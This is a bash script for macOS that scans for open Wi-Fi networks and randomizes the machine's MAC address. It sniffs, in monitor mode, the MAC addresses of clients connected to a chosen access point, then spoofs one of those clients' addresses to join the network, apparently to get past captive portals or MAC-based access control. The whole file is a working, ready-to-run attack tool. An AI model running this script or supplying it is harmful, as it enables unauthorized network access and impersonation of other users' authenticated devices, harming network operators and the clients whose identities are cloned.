#!/bin/bash

IFACE=${1:-en0}
AIRPORT=/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport
ORIG_MAC=$(ifconfig ${IFACE} | awk '/ether/{print $2}')
TCP_PID=-1

function cleanup {
    printf "[!] trying to cleanup\n"
    if [ "${TCP_PID}" -ne -1 ]; then
        printf "[-] killing %d\n" ${TCP_PID}
        kill -9 ${TCP_PID}
        printf "[+] killed\n" 
    fi

    printf "[!] reverting mac to %s\n" ${ORIG_MAC}
    change_mac ${IFACE} ${ORIG_MAC}

    printf "[!] disconnecting\n"
    ap_disconnect ${IFACE}
}

function main {
    if [[ $EUID -ne 0 ]]; then
       printf "[!] This script must be run as root\n" 
       exit 1
    fi

    trap 'error ${LINENO}' ERR
    clear

    local iface=${IFACE}
    local rand_mac=$(openssl rand -hex 6 | sed "s/\(..\)/\1:/g; s/.$//")

    # randomize the mac address 
    printf "[!] original mac is ${ORIG_MAC}\n"
    change_mac "${iface}" "${rand_mac}"

    # perform an ap scan and parse the results
    ap_scan "${iface}"

    local ap_num
    printf "[?] choose a target network (number)\n"
    read ap_num
    local ap_ssid=${SSID_LIST[ap_num]}
    local ap_bssid=${BSSID_LIST[ap_num]}
    local ap_channel=${CHANNEL_LIST[ap_num]}

    # disconnect from all aps
    ap_disconnect ${iface}

    # change channel for proper sniffing
    ap_change_channel ${iface} ${ap_channel}

    printf "[-] starting tcpdump\n"
    touch macs.log
    tcpdump --monitor-mode -e --interface ${iface} ether src ${ap_bssid} -n -l 2>/dev/null | \
        awk 'match($0,/(DA:)(([a-f]|[0-9]){2}:){5}([a-f]|[0-9]){2}/) \
        {print substr($0,RSTART+3,RLENGTH-3) >> "macs.log"}' &
    TCP_PID=$!
    printf "[+] started with pid %d\n" "${TCP_PID}"

    printf "[*] starting main loop\n"
    trap "control_c \"${iface}\" \"${ap_ssid}\"" SIGINT
    tput sc
    while true
    do
        tput rc 
        #tput ed # throwing an error
        printf "mac address histogram (ctrl+c to stop)\n"
        sort -n macs.log | uniq -c | sort -nr | xargs -L1 ./oui.sh
    done
    tput rc
    tput ed
}

function control_c {
    # this enables us to get ssids with spaces
    local args="$@"
    local iface=`echo ${args} | cut -d' ' -f 1`
    local ssid=`echo ${args} | cut -d' ' -f 2-`

    printf "mac address histogram (ctrl+c to stop)\n"
    sort -n macs.log | uniq -c | sort -nr | xargs -L1 ./oui.sh
    rm  macs.log

    local spoof_mac
    echo -en "[?] what mac do you want to spoof?\n"
    read spoof_mac

    change_mac "${iface}" "${spoof_mac}"

    ap_connect "${iface}" "${ssid}"

    printf "[*] waiting to test connection\n"
    sleep 10

    test_connection "${iface}"
    if [ $? -ne 0 ]; then 
        ap_disconnect "${iface}"
        change_mac "${iface}" "${ORIG_MAC}"
        exit 1
    fi;

    printf "[+] complete\n"
    exit $?
}


function change_mac {
    local iface="$1"
    local mac="$2"

    printf "[-] changing %s mac to %s\n" "${iface}" "${mac}"
    ifconfig ${iface} ether ${mac}
    printf "[+] success!\n"
}

function ap_connect {
    local iface="$1"
    local ssid="$2"
    printf "[-] connecting to %s on %s\n" "${ssid}" "${iface}"
    networksetup -setairportnetwork "${iface}" "${ssid}"
    printf "[+] attempt complete\n"
}

function ap_disconnect {
    local iface="$1"
    printf "[-] disconnecting from all aps on %s\n" "${iface}"
    ${AIRPORT} en0 -z
    printf "[+] disconnected\n"
}

function ap_change_channel {
    local iface="$1"
    local channel="$2"
    printf "[-] changing to channel %d\n" "${channel}"
    ${AIRPORT} ${iface} -c${channel}
    printf "[+] channel changed\n"
}


SSID_LIST=()
BSSID_LIST=()
CHANNEL_LIST=()
function ap_scan {
    local iface="$1"

    printf "[-] scanning for aps\n"

    # make an array of each line
    IFS=$'\r\n' GLOBIGNORE='*' command eval  \
        'ap_list=($(${AIRPORT} ${iface} -s | grep NONE))'

    printf "NUM\tRSSI\tSSID\tBSSID\tCHAN\n"

    local ap_row
    local ap_ssid
    local ap_bssid
    local ap_rssi
    local ap_channel
    for i in "${!ap_list[@]}"
    do 
        ap_row=`echo ${ap_list[i]}` # dunno why this helps

        ap_ssid=`echo ${ap_row} | \
            awk 'match($0,/^(.+)(([a-f]|[0-9]){2}:){5}([a-f]|[0-9]){2}/) \
            {print substr($0,RSTART,RLENGTH-18)}'`
        SSID_LIST[i]=${ap_ssid}

        ap_row=${ap_row##${ap_ssid}} # remove the ssid from the line

        ap_bssid=`echo ${ap_row} | cut -f1 -d' '`
        BSSID_LIST[i]=${ap_bssid}

        ap_rssi=`echo ${ap_row} | cut -f2 -d' '`

        ap_channel=`echo ${ap_row} | cut -f3 -d' '`
        CHANNEL_LIST[i]=${ap_channel}
        printf "[%d]\t%d\t%s\t%s\t%s\n" \
            "${i}" "${ap_rssi}" "${ap_ssid}" "${ap_bssid}" "${ap_channel}"
    done
    unset ap_list
}

function test_connection {
    local iface="$1"

    local status=404
    local code=0
    
    printf "[-] testing connection\n" 
    status=`curl -s -o /dev/null -w "%{http_code}" https://www.google.com/`
    if [ ${status} -eq 200 ]; then
        printf "[+] connection looks online!\n"
        code=0
    else
        printf "[!] uh-oh doesn't look like it worked!\n"
        code=1
    fi

    return ${code}
}

function error {
    local parent_lineno="$1"
    local message="$2"
    local code="${3:-1}"
        printf "[!] error on or near line %d" "${parent_lineno}"
    if [[ -n "$message" ]] ; then
        printf ": %s\n" "${parent_lineno}" "${message}"
    else
        printf "\n"
    fi
    printf "[!] exiting with status %d\n" "${code}"

    cleanup

    exit "${code}"
}

main "$@"
